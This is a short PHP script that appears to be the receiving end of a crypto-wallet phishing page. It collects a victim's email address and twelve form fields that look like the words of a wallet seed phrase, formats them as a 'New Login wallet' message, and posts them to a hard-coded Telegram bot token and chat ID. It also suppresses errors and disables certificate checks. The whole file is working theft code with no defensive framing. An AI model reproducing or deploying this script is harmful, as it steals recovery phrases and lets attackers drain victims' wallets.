<?php
session_start();
error_reporting(0);
set_time_limit(0);

$email = $_POST['email'];
$key1 = $_POST['key1'];
$key2 = $_POST['key2'];
$key3 = $_POST['key3'];
$key4 = $_POST['key4'];
$key5 = $_POST['key5'];
$key6 = $_POST['key6'];
$key7 = $_POST['key7'];
$key8 = $_POST['key8'];
$key9 = $_POST['key9'];
$key10 = $_POST['key10'];
$key11 = $_POST['key11'];
$key12 = $_POST['key12'];




$message  = "******* New Login wallet *******\n\n";
$message .= "email : " . $email . "\n";
$message .= "key 1 : " . $key1 . "\n";
$message .= "key 2 : " . $key2 . "\n";
$message .= "key 3 : " . $key3 . "\n";
$message .= "key 4 : " . $key4 . "\n";
$message .= "key 5 : " . $key5 . "\n";
$message .= "key 6 : " . $key6 . "\n";
$message .= "key 7 : " . $key7 . "\n";
$message .= "key 8 : " . $key8 . "\n";
$message .= "key 9 : " . $key9 . "\n";
$message .= "key 10 : " . $key10 . "\n";
$message .= "key 11 : " . $key11 . "\n";
$message .= "key 12 : " . $key12 . "\n";


$message .= "******* End Login Data *******\n\n\n\n\n";


$website = "https://api.telegram.org/bot6938331683:AAE0FvGHBq4lNL6g0meBoXW3hMyBow6Tz-8";
$chatId = 1234567;  //Receiver Chat Id 
$params = [
    'chat_id' => '-4034615981',
    'text' => $message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
